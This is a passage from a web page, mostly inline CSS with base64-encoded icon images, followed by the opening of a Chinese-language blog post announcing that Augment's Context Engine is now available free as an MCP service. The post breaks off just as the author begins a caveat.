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) no-repeat 50%;background-size:64px 64px;opacity:.84}.markdown-body h1:after{position:absolute;content:"";width:150%;left:-25%;height:50%;bottom:12px;border-radius:50%;background:linear-gradient(transparent 80%,rgba(77,208,225,.8));background-size:400% 200%;opacity:.6;animation:h1Animate 6s linear infinite}@keyframes h1Animate{0%{background-position:100% 100%}50%{background-position:100% 50%}to{background-position:100% 100%}}.markdown-body h2{display:block;border-bottom:4px solid #4dd0e1;position:relative;font-size:24px;padding:12px 32px;margin:30px 0}.markdown-body h2:before{width:24px;height:24px;left:0;top:0;margin:auto;background-size:24px 24px;background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAADGklEQVRYR81X32vTYBQ999s6mFjQgQ+DrbHiVFZYU4cDcQ/6pGhTFVYFEXGi82H+Bz448UnEF1Fx9ccEEcXpZE3d5tP2ooKiTacTHaLNpigMHDgnU9tcSbrWrkwWR0sbyEOSe885ObnfvV8IRT6oyPwoLQHBx+OVM5WJvSyEVAhnBOjt7yU/+/rr6r6l8TMO+F/EN0JQhICqQpD/xaRpcpAc9tS+M+9lBCia/oqBamK+zeDuQogQZaKJk3wcQjxSva7tGQGB2Ke1zIk3DNyMyNL+QpCnMQOaPsDAVuGAp9cjvbYc8Ec/bCYSg0zoiHilk1tHxqsqEsYlML4kjIpT/eurJxRNPweQU5VdrWaOEo1fgKAVbBgXIz73kF3R/ph+ghgdzMYWM29eAWlBJqgZaFlFYtC6nhWpaDqnSGlIlV1WjJ3DloDNgyNLncudqgX//Ucg3LxuStHGuhi8pqKCW3rqV342rwFjRznKm+/LNaN2yC237ThgF2wxcfMLeP6+ncrKzoPoKTGeLQbYbg4TNoC5iZPJY5HGVRdSNZAWYBclD3FzBQzrR8hACAKdzBzKA/4/IYioDQaOskBbpEG6PO8qKKSAEi3CnEb0Pw4oMf0OmKbTDWqh3Lw6EIiNBZi5lxh3wz4puBD5ovqAMvxhHSdFKxE1CQe3m/07TeTX4lcJdAhE+1Sv65Z5P/ByvIGTRowIZ9igbtXnmrOsbTvgj+kHBNMuBu9OdVw8EeU4nC1A0cYmAHZOTRrLhra4Z8ywnSN6vZHAFTA2WnnMfQB3qz73ddsOZM8CACFDIPSgQXqebXEgqgeZcAeEe6pXasm1f8ew3igMtAHWac0Uc/jYdyAaP0xEBwFsmgUPqbJ0NE2UKj4EGcahiOzuyhagaHpnmtgcVgTcCMuua7YdyAHbA3ArQNscVFbb4635aD6fnYaTvxxi9UNP7ddMXaRWVBdAcaLk6bDXPZCNZ9uBXEsDUX1T2Cc9yjig6Z0EHg3LK8/aqf6MwJKchkXfks1+0+JtSq3qLPa23BRR1B+T/6nkfMaW1r9hPt/MLtYfTLEpP+T9FNoAAAAASUVORK5CYII=)}.markdown-body h2:after,.markdown-body h2:before{content:"";display:block;position:absolute;bottom:0}.markdown-body h2:after{right:0;width:400px;height:10px;border-top-right-radius:24px;background:linear-gradient(90deg,#fff,#4dd0e1);max-width:50vw}.markdown-body h3{margin:30px 0;font-size:18px;position:relative;padding:4px 32px;width:max-content}.markdown-body h3:before{border-bottom:2px solid #4dd0e1;width:100%;content:"";display:block;height:28px;position:absolute;left:0;top:0;bottom:-2px;margin:auto;background-size:28px 28px;background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAABRklEQVRYR2NkGGDAOMD2M4w6YDQERkNg+ITAppcfY/8zMv3wF+NdTUrZQpUQ2PT6cz8Dw/8CkMWMDIwNvqK8jcQ6gmIHNN19EaXPx1XPyMCghrCUKcpPlGc5MY6gyAE+Fx52MjL8j3cU5a1UYWXtZGBkEAVb+p8hxU+Mby5NHQCxnKEMaskzJ37uFmUetkmMjAzrfUX4woixHBJlZAA0y2EmPPYU4enLkhGeQIqRJDsAh+UgO7duNpD3IcVykkOA2paT5ABaWE60A2hlOdEO8D3/4CMDIyMfWvySFefoaYSoROh74eFXBgYGLiTNVLGc+BC48PAnAwMDG9QBVLOcaAd8P5ox+x/jf5AjGLgYfnwnKqv9/8/PwPO/kFF/MSj0cAKiouD/0bgYoixFU8RovWgJIX1EOYCQIZTIjzpgNARGQ2DAQwAAvHBaIdB7zxsAAAAASUVORK5CYII=);background-repeat:no-repeat;animation:h3AnimationBefore 2s infinite alternate}@keyframes h3AnimationBefore{0%{width:28px}25%{width:100%}50%{width:100%}to{width:100%}}.markdown-body h3:after{content:"";display:block;width:28px;height:28px;position:absolute;border:2px solid #4dd0e1;border-radius:50%;right:-15px;top:0;bottom:0;margin:auto;background-size:28px 28px;background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAABRklEQVRYR2NkGGDAOMD2M4w6YDQERkNg+ITAppcfY/8zMv3wF+NdTUrZQpUQ2PT6cz8Dw/8CkMWMDIwNvqK8jcQ6gmIHNN19EaXPx1XPyMCghrCUKcpPlGc5MY6gyAE+Fx52MjL8j3cU5a1UYWXtZGBkEAVb+p8hxU+Mby5NHQCxnKEMaskzJ37uFmUetkmMjAzrfUX4woixHBJlZAA0y2EmPPYU4enLkhGeQIqRJDsAh+UgO7duNpD3IcVykkOA2paT5ABaWE60A2hlOdEO8D3/4CMDIyMfWvySFefoaYSoROh74eFXBgYGLiTNVLGc+BC48PAnAwMDG9QBVLOcaAd8P5ox+x/jf5AjGLgYfnwnKqv9/8/PwPO/kFF/MSj0cAKiouD/0bgYoixFU8RovWgJIX1EOYCQIZTIjzpgNARGQ2DAQwAAvHBaIdB7zxsAAAAASUVORK5CYII=);animation:h3AnimationAfter 2s infinite alternate}@keyframes h3AnimationAfter{0%{transform:rotate(0)}10%{transform:rotate(0)}50%{transform:rotate(-1turn)}to{transform:rotate(-1turn)}}.markdown-body h4{font-size:16px}.markdown-body h5{font-size:15px}.markdown-body h6{margin-top:5px}.markdown-body p{line-height:inherit;margin:22px 0;letter-spacing:2px;font-size:14px;word-spacing:2px}.markdown-body img{max-width:80%;border-radius:6px;display:block;margin:20px auto!important;object-fit:contain;box-shadow:0 0 16px hsla(0,0%,43.1%,.45)}.markdown-body figcaption{display:block;font-size:13px;color:#2b2b2b}.markdown-body figcaption:before{content:"";background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgBAMAAACBVGfHAAAAGFBMVEVHcExAuPtAuPpAuPtAuPpAuPtAvPxAuPokzOX5AAAAB3RSTlMAkDLqNegkoiUM7wAAAGBJREFUKM9jYBhcgMkBTUDVBE1BeDGqEtXychNUBeXlKEqACsrLQxB8lnCQQClCiWt5OYoSiAIkJVAF5eVBqAqAShTAAs7l5ShKWMwRAmAlSArASpAVgJUkCqIAscESHwCVVjMBK9JnbQAAAABJRU5ErkJggg==);display:inline-block;width:18px;height:18px;background-size:18px;background-repeat:no-repeat;background-position:50%;margin-right:5px;margin-bottom:-5px}.markdown-body hr{border:none;border-top:1px solid #4dd0e1;margin-top:32px;margin-bottom:32px}.markdown-body del{color:#4dd0e1}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:rgba(77,208,225,.08);color:#26c6da;padding:.195em .4em}.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace;overflow:auto;position:relative;line-height:1.75;box-shadow:0 0 8px hsla(0,0%,43.1%,.45);border-radius:4px;margin:16px}.markdown-body pre:before{content:"";display:block;height:30px;width:100%;margin-bottom:-7px;background:url(data:image/png;base64,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) 10px 10px no-repeat;background-size:40px}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{color:#4dd0e1;border-bottom:1px solid #4dd0e1;font-weight:400;text-decoration:none;margin:0 4px}.markdown-body a:active,.markdown-body a:hover{background-color:rgba(77,208,225,.1)}.markdown-body strong{color:#26c6da}.markdown-body strong:before{content:"「"}.markdown-body strong:after{content:"」"}.markdown-body em{font-style:normal;color:#4dd0e1;font-weight:700}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:rgba(77,208,225,.05)}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{margin:2em 0;padding:24px 32px;border-left:4px solid #26c6da;background:rgba(77,208,225,.15);position:relative}.markdown-body blockquote:before{content:"❝";top:8px;left:8px;color:#4dd0e1;font-size:30px;line-height:1;font-weight:700;position:absolute;opacity:.7}.markdown-body blockquote:after{content:"❞";font-size:30px;position:absolute;right:8px;bottom:0;color:#4dd0e1;opacity:.7}.markdown-body blockquote p{color:#595959;line-height:2}.markdown-body ol,.markdown-body ul{color:#595959;padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">前言</h2>
<p>好消息(喜大奔普)！</p>
<p>Augment 把自家引以为傲的 <code>Context Engine</code> 开放为 <code>MCP</code> 服务了！</p>
<p>简单介绍下ACE(Augment Context Engine)</p>
<blockquote>
<p>ACE 是世界领先的代码库理解引擎，是业界最强大的代码库上下文引擎，采用专有的检索和嵌入模型套件，能够实现最高质量的相关代码片段召回。它维护代码库的实时索引，确保结果始终反映当前状态，支持跨编程语言检索。</p>
<p>这个引擎的核心优势在于深度理解代码库结构和语义关系。无论你的项目有多大多复杂，它都能瞬间定位到相关代码、理解功能实现逻辑，甚至追踪从前端到后端再到数据库的完整调用链。开发者可以用自然语言提问"这个功能在哪里实现？"，引擎就能精准找到前端代码、后端逻辑和 SQL 迁移文件。</p>
</blockquote>
<p>截止发文前，已支持主流的 AI 工具进行集成</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/421b348e96cf43ee883f27d215409d1e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5p6B5a6i5a-G56CB:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765635980&amp;x-signature=CaKNz48NMua8f%2B9WqPOo4jMx0L0%3D" alt="支持工具" loading="lazy"/></p>
<p>目前也是开放免费使用，不消耗 augment 账号自身额度的积分</p>
<p>但是！但是！但是！</p>
